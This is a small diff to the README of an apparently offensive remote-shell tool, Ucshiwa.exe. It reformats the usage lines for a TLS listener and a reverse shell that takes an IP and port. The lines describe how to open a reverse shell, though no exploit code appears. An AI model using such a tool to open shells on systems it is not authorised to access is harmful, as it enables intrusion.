@@ -10,11 +10,15 @@ Execute it without any options to print help
 
 ### listener
 
-`Ucshiwa.exe <port> <certificate.pfx> <passwd>`
+```shell
+Ucshiwa.exe <port> <certificate.pfx> <passwd>
+```
 
 ### reverse shell
 
-`Ucshiwa.exe <ip> <port>`
+```shell
+Ucshiwa.exe <ip> <port>
+```
 
 ### native shell
 
